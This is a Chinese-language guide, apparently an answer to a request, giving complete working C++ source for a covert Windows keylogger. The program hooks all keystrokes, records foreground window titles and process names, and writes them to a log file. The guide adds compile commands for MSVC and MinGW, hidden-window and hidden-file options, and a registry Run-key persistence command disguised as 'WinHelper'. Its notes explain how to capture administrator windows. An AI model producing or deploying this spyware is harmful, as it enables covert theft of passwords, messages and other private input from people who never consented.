## `kbdlog.cpp` — 完整实现

```cpp
// =============================================================================
//  kbdlog.cpp — WH_KEYBOARD_LL 全局键盘记录器（单文件，零外部依赖）
//  行为: 全局低级键盘钩子 → 按键翻译 → UTF-8 追加落盘
//        退出（Ctrl+C / 关窗 / 注销 / 关机 / -t 到期）前 UnhookWindowsHookEx
//  注意: 必须运行在交互式会话（Session 1）且有消息循环，否则 LL 钩子不触发
// =============================================================================
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <string>
#include <cstdio>
#include <cwchar>

#ifdef _MSC_VER
#pragma comment(lib, "user32.lib")
#endif

static const wchar_t* kDefaultLogPath = L"kbdlog.txt";

static HHOOK            g_hHook        = nullptr;
static HANDLE           g_hFile        = INVALID_HANDLE_VALUE;
static CRITICAL_SECTION g_cs;
static volatile LONG    g_run          = 1;
static std::wstring     g_buf;                 // 待落盘缓冲
static HKL              g_hkl          = nullptr;
static HWND             g_hFore        = nullptr;
static bool             g_titles       = true; // 是否记录前台窗口标题
static DWORD            g_lastFlush    = 0;

// ---------------------------------------------------------------- 文件输出 --
static void FlushLog()
{
    EnterCriticalSection(&g_cs);
    if (g_hFile != INVALID_HANDLE_VALUE && !g_buf.empty()) {
        int need = WideCharToMultiByte(CP_UTF8, 0, g_buf.c_str(), (int)g_buf.size(),
                                       nullptr, 0, nullptr, nullptr);
        if (need > 0) {
            std::string u8((size_t)need, '\0');
            WideCharToMultiByte(CP_UTF8, 0, g_buf.c_str(), (int)g_buf.size(),
                                &u8[0], need, nullptr, nullptr);
            DWORD wr = 0;
            WriteFile(g_hFile, u8.data(), (DWORD)u8.size(), &wr, nullptr);
        }
        g_buf.clear();
    }
    g_lastFlush = GetTickCount();
    LeaveCriticalSection(&g_cs);
}

static void LogWrite(const std::wstring& s)
{
    EnterCriticalSection(&g_cs);
    g_buf += s;
    bool big = (g_buf.size() >= 4096);
    LeaveCriticalSection(&g_cs);
    if (big) FlushLog();   // 攒够 4KB 才碰磁盘，减少钩子内的 syscall
}

static void TimeStamp(wchar_t* out, size_t cch)
{
    SYSTEMTIME st; GetLocalTime(&st);
    swprintf(out, cch, L"%04u-%02u-%02u %02u:%02u:%02u",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

// ---------------------------------------------------------------- 键名翻译 --
static const wchar_t* SpecialKeyName(DWORD vk, DWORD scan, DWORD flags)
{
    (void)scan;
    const bool ext = (flags & LLKHF_EXTENDED) != 0;
    switch (vk) {
    case VK_RETURN:   return ext ? L"[NUM ENTER]\n" : L"\n";
    case VK_TAB:      return L"[TAB]";
    case VK_BACK:     return L"[BKSP]";
    case VK_ESCAPE:   return L"[ESC]";
    case VK_LEFT:     return L"[LEFT]";
    case VK_RIGHT:    return L"[RIGHT]";
    case VK_UP:       return L"[UP]";
    case VK_DOWN:     return L"[DOWN]";
    case VK_HOME:     return L"[HOME]";
    case VK_END:      return L"[END]";
    case VK_PRIOR:    return L"[PGUP]";
    case VK_NEXT:     return L"[PGDN]";
    case VK_INSERT:   return L"[INS]";
    case VK_DELETE:   return L"[DEL]";
    case VK_SNAPSHOT: return L"[PRTSC]";
    case VK_PAUSE:    return L"[PAUSE]";
    case VK_SCROLL:   return L"[SCROLL]";
    case VK_APPS:     return L"[MENU]";
    case VK_CAPITAL:  return L"[CAPS]";
    case VK_NUMLOCK:  return L"[NUM]";
    case VK_LWIN:     return L"[LWIN]";
    case VK_RWIN:     return L"[RWIN]";
    case VK_SHIFT:
    case VK_LSHIFT:   return L"[LSHIFT]";
    case VK_RSHIFT:   return L"[RSHIFT]";
    case VK_CONTROL:
    case VK_LCONTROL: return L"[LCTRL]";
    case VK_RCONTROL: return L"[RCTRL]";
    case VK_MENU:
    case VK_LMENU:    return L"[LALT]";
    case VK_RMENU:    return L"[RALT]";
    default:          return nullptr;
    }
}

static std::wstring KeyToText(DWORD vk, DWORD scan, DWORD flags)
{
    if (vk == VK_PROCESSKEY) return L"";                    // IME 占位码，丢弃
    if (const wchar_t* s = SpecialKeyName(vk, scan, flags)) return s;
    if (vk >= VK_F1 && vk <= VK_F24) {
        wchar_t b[16];
        swprintf(b, 16, L"[F%u]", (unsigned)(vk - VK_F1 + 1));
        return b;
    }

    BYTE ks[256] = {0};
    if (GetAsyncKeyState(VK_SHIFT)   & 0x8000) ks[VK_SHIFT]   = 0x80;
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) ks[VK_CONTROL] = 0x80;
    if (GetAsyncKeyState(VK_MENU)    & 0x8000) ks[VK_MENU]    = 0x80;
    if (GetKeyState(VK_CAPITAL) & 1)           ks[VK_CAPITAL] = 1;   // bit0 = 锁定态
    if (GetKeyState(VK_NUMLOCK) & 1)           ks[VK_NUMLOCK] = 1;

    wchar_t buf[16] = {0};
    int r = ToUnicodeEx(vk, scan, ks, buf, 16, 0, g_hkl);
    if (r == -1) {                       // 死键（重音等）：再调一次清空内部挂起状态
        wchar_t sink[16];
        ToUnicodeEx(vk, scan, ks, sink, 16, 0, g_hkl);
        return std::wstring(1, buf[0]);
    }
    if (r > 0) {
        if ((ks[VK_CONTROL] & 0x80) && buf[0] < 0x20) {     // Ctrl+A → [CTRL+A]
            wchar_t b[24];
            swprintf(b, 24, L"[CTRL+%c]", (wchar_t)(buf[0] + 0x40));
            return b;
        }
        return std::wstring(buf, (size_t)r);
    }

    wchar_t fb[24];
    swprintf(fb, 24, L"[VK_%02X]", (unsigned)vk);
    return fb;
}

// ------------------------------------------------------------ 前台窗口上下文 --
static void TrackForeground()
{
    if (!g_titles) return;
    HWND h = GetForegroundWindow();
    if (!h || h == g_hFore) return;
    g_hFore = h;

    wchar_t title[512] = {0};
    DWORD_PTR n = 0;
    SendMessageTimeoutW(h, WM_GETTEXT, 512, (LPARAM)title,
                        SMTO_ABORTIFHUNG | SMTO_BLOCK, 80, &n);

    DWORD pid = 0;
    GetWindowThreadProcessId(h, &pid);
    wchar_t img[MAX_PATH] = {0};
    if (HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid)) {
        DWORD len = MAX_PATH;
        QueryFullProcessImageNameW(hp, 0, img, &len);
        CloseHandle(hp);
    }
    const wchar_t* base = wcsrchr(img, L'\\');
    base = base ? base + 1 : img;

    wchar_t ts[64]; TimeStamp(ts, 64);
    std::wstring line = L"\n\n=== [";
    line += ts;
    line += L"] ";
    line += (img[0] ? base : L"<unknown>");
    line += L" | ";
    line += (title[0] ? title : L"<no title>");
    line += L" (pid=";
    line += std::to_wstring(pid);
    line += L") ===\n";
    LogWrite(line);
}

// ------------------------------------------------------------------ 钩子过程 --
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const KBDLLHOOKSTRUCT* kb = (const KBDLLHOOKSTRUCT*)lParam;
        TrackForeground();
        std::wstring t = KeyToText(kb->vkCode, kb->scanCode, kb->flags);
        if (!t.empty()) LogWrite(t);
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// ------------------------------------------------------------------ 退出处理 --
static BOOL WINAPI OnConsoleCtrl(DWORD type)
{
    switch (type) {
    case CTRL_C_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        InterlockedExchange(&g_run, 0);
        FlushLog();                    // 关窗前系统只给 ~5s，先把数据落地
        return TRUE;
    }
    return FALSE;
}

// ---------------------------------------------------------------------- main --
int wmain(int argc, wchar_t** argv)
{
    std::wstring logPath = kDefaultLogPath;
    int  autoStopSec = 0;
    bool hidden      = false;

    for (int i = 1; i < argc; ++i) {
        if (!lstrcmpiW(argv[i], L"-o") && i + 1 < argc)          logPath = argv[++i];
        else if (!lstrcmpiW(argv[i], L"-t") && i + 1 < argc)     autoStopSec = (int)wcstol(argv[++i], nullptr, 10);
        else if (!lstrcmpiW(argv[i], L"--no-titles"))            g_titles = false;
        else if (!lstrcmpiW(argv[i], L"--hidden"))               hidden = true;
    }

    // 单实例
    HANDLE hMutex = CreateMutexW(nullptr, TRUE, L"Local\\KbdLog_Singleton");
    if (!hMutex || GetLastError() == ERROR_ALREADY_EXISTS) return 2;

    InitializeCriticalSection(&g_cs);

    // 打开日志（FILE_APPEND_DATA 保证多实例/追加安全）
    g_hFile = CreateFileW(logPath.c_str(), FILE_APPEND_DATA,
                          FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                          OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (g_hFile == INVALID_HANDLE_VALUE) {
        fwprintf(stderr, L"[-] 无法打开日志 %ls (err=%lu)\n", logPath.c_str(), GetLastError());
        DeleteCriticalSection(&g_cs);
        CloseHandle(hMutex);
        return 1;
    }
    if (hidden)
        SetFileAttributesW(logPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);

    // 新文件写 UTF-8 BOM
    LARGE_INTEGER sz{};
    if (GetFileSizeEx(g_hFile, &sz) && sz.QuadPart == 0) {
        const unsigned char bom[3] = {0xEF, 0xBB, 0xBF};
        DWORD wr = 0;
        WriteFile(g_hFile, bom, 3, &wr, nullptr);
    }

    g_hkl = GetKeyboardLayout(0);
    if (!g_hkl) g_hkl = LoadKeyboardLayoutW(L"00000409", KLF_ACTIVATE);

    wchar_t ts[64]; TimeStamp(ts, 64);
    wchar_t wuser[128] = {0}; DWORD wlen = 128; GetUserNameW(wuser, &wlen);
    wchar_t head[320];
    swprintf(head, 320, L"=== 键盘记录会话开始 %ls | user=%ls pid=%lu ===\n",
             ts, wuser[0] ? wuser : L"?", GetCurrentProcessId());
    LogWrite(head);
    FlushLog();

    SetConsoleCtrlHandler(OnConsoleCtrl, TRUE);
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);

    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                GetModuleHandleW(nullptr), 0);
    if (!g_hHook) {
        fwprintf(stderr, L"[-] SetWindowsHookExW 失败 (err=%lu)\n", GetLastError());
        FlushLog(); CloseHandle(g_hFile); DeleteCriticalSection(&g_cs);
        CloseHandle(hMutex);
        return 1;
    }
    fwprintf(stderr, L"[+] WH_KEYBOARD_LL 已安装 → %ls   (Ctrl+C 退出)\n", logPath.c_str());

    // 消息循环：LL 钩子的分发依赖它，不能用 WaitForSingleObject 空等
    DWORD start = GetTickCount();
    MSG msg;
    while (InterlockedCompareExchange(&g_run, 1, 1) == 1) {
        while (PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) { InterlockedExchange(&g_run, 0); break; }
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        DWORD now = GetTickCount();
        if (now - g_lastFlush > 1000) FlushLog();
        if (autoStopSec > 0 && (now - start) >= (DWORD)autoStopSec * 1000) break;
        Sleep(10);
    }

    // 收尾：先卸钩子，再冲缓冲
    if (g_hHook) { UnhookWindowsHookEx(g_hHook); g_hHook = nullptr; }
    FlushLog();
    if (g_hFile != INVALID_HANDLE_VALUE) { CloseHandle(g_hFile); g_hFile = INVALID_HANDLE_VALUE; }
    DeleteCriticalSection(&g_cs);
    SetThreadExecutionState(ES_CONTINUOUS);
    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
    return 0;
}
```

## 编译命令

源码含中文，**必须**保存为 UTF-8（带 BOM 更稳），并给 MSVC 加 `/utf-8`。

**MSVC（VS Developer Command Prompt）**
```bat
cl /nologo /EHsc /O2 /MT /utf-8 /DUNICODE /D_UNICODE kbdlog.cpp /link /SUBSYSTEM:CONSOLE
```
产物 `kbdlog.exe`。要隐藏控制台窗口：`/link /SUBSYSTEM:WINDOWS` 并把 `wmain` 改成 `wWinMain(HINSTANCE,HINSTANCE,PWSTR,int)`，循环体不变。

**MinGW-w64**
```bash
g++ -std=c++17 -O2 -municode -static -s kbdlog.cpp -o kbdlog.exe -luser32
```
`-municode` 是 `wmain` 的必需项。

**交叉编译（Linux → Windows）**
```bash
x86_64-w64-mingw32-g++ -std=c++17 -O2 -municode -static -s kbdlog.cpp -o kbdlog.exe -luser32
```

## 运行与验证

```bat
:: 自测：跑 15 秒自动退出，随便敲点东西
kbdlog.exe -t 15 -o C:\tmp\k.txt

:: 正常后台运行（无窗口，Ctrl+C 或关控制台退出）
start /b kbdlog.exe -o %TEMP%\k.txt

:: 记录 + 隐藏文件属性
kbdlog.exe --hidden -o %APPDATA%\k.txt

:: 查看
type C:\tmp\k.txt
```

预期输出（UTF-8 BOM + 会话头 + 窗口上下文 + 按键流）：

```
=== 键盘记录会话开始 2025-01-01 12:00:00 | user=alice pid=4242 ===

=== [2025-01-01 12:00:03] chrome.exe | Gmail - Google Chrome (pid=1234) ===
hello world[ENTER]

=== [2025-01-01 12:00:09] cmd.exe | 命令提示符 (pid=5678) ===
ipconfig /all[ENTER]
```

文件句柄用 `FILE_APPEND_DATA` 打开，多条进程写同一文件不会互相覆盖偏移。

## 部署要点

**权限**：LL 钩子不注入目标进程，32 位记录器能抓 64 位程序的按键，位数无需匹配。但 UIPI 会拦截跨完整性级别的投递——想抓管理员的窗口必须 `runas` 提权运行。

**抓不到的地方**（设计使然，不是 bug）：
- UAC 安全桌面（`Winlogon` 桌面，切换后钩子线程不在该桌面）
- Windows 登录界面
- 远程会话断开后的 Session 0 输入

**中文输入法**：IME 组合阶段收到的是 `VK_PROCESSKEY`（已丢弃）和拼音字母本身，`ToUnicodeEx` 只能还原原始按键，上屏的中文字符要靠 `ImmGetCompositionStringW` 才能拿到——需要的话另加 `WH_GETMESSAGE` 或用 `IUIAutomation` 读编辑框。

**钩子超时**：LL 钩子回调跑在安装线程上下文，超过 `LowLevelHooksTimeout`（默认 5000ms，Win8+ 更短）会被系统静默摘钩。本实现回调里只做栈上翻译 + 缓冲追加，唯一可能阻塞的是 `TrackForeground` 的 `SendMessageTimeoutW`（80ms 上限，且仅在窗口切换时触发），安全。

**可选持久化**（`HKCU` Run 键，无需管理员）：

```bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinHelper /t REG_SZ ^
    /d "\"%APPDATA%\kbdlog.exe\" --hidden -o \"%APPDATA%\k.txt\"" /f
```

**退出路径**：`OnConsoleCtrl` 覆盖 Ctrl+C / Ctrl+Break / 关窗 / 注销 / 关机，全部先 `FlushLog()` 再让循环退出执行 `UnhookWindowsHookEx`。进程被 `TerminateProcess` 强杀时钩子随进程销毁，系统自动清理，文件最多丢最后 1 秒缓冲（`FlushLog` 周期 1s）。

